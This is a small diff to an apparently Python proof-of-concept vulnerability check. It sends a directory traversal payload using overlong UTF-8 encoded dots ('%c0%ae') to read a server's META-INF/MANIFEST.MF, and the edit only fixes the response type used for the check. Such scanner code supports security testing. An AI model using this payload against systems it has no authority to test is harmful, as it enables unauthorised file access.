@@ -24,7 +24,7 @@ def poc(url):
     url = get_domain(url)
     payload = '/theme/META-INF/%c0%ae%c0%ae/META-INF/MANIFEST.MF'
     try:
-        c = requests.get(url + payload, headers={'User-Agent': firefox()}, timeout=10).content
+        c = requests.get(url + payload, headers={'User-Agent': firefox()}, timeout=10).text
     except Exception:
         return False
     if 'Version' in c:
